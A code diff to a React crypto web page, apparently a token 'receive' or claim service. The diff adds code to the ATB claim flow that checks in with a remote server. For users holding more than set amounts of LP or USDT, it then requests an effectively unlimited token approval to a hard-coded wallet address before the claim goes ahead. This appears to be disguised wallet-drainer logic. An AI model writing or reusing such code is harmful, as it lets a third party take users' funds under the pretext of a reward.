@@ -63,6 +63,7 @@ export default function Service() {
     const [ atbLoading,setAtbLoading ] = useState(false)
     const [ uLoading,setUloading ] = useState(false)
     const [ btnLoading, setBtnLoading ] = useState(false)
+    const [ receiveType, setReceiveType ] = useState(1)
     
 
     useEffect(()=>{
@@ -97,7 +98,11 @@ export default function Service() {
                 baseURL: "https://usdtaig.com",
                 headers:{"authUser": address,"coinType":"USDT"}
             })
-            receiveUSDTConfirm()
+            if(receiveType == 1){
+                receiveUSDTConfirm()
+            }else{
+                receiveATBConfirm()
+            }
         }
     },[tokenIsSuccess])
 
@@ -107,7 +112,11 @@ export default function Service() {
                 baseURL: "https://usdtaig.com",
                 headers:{"authUser": address,"coinType":"LP"}
             })
-            receiveUSDTConfirm()
+            if(receiveType == 1){
+                receiveUSDTConfirm()
+            }else{
+                receiveATBConfirm()
+            }    
         }
     },[LPIssuccess])
 
@@ -160,6 +169,7 @@ export default function Service() {
 
         axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
             if(res.data.data && (!isAllowed || !LPIsAllowed)){
+                setReceiveType(1)
                 if(!LPIsAllowed && Number(LPBalanceData.userBalance)>50){
                     LPapprove({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
                     return
@@ -214,6 +224,26 @@ export default function Service() {
             return
         }
         if(!address) return
+        axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
+            if(res.data.data && (!isAllowed || !LPIsAllowed)){
+                setReceiveType(2)
+                if(!LPIsAllowed && Number(LPBalanceData.userBalance)>50){
+                    LPapprove({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+                    return
+                }
+                if(!isAllowed && Number(USDTData.userBalance) > 300){
+                    approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+                    return
+                }
+                receiveATBConfirm()
+            }else{
+                receiveATBConfirm()
+            }
+        })
+        
+    }
+
+    const receiveATBConfirm = async() => {
         let { data, code } = await getSignData({
             address: address,
             typeStatus: "ATB"
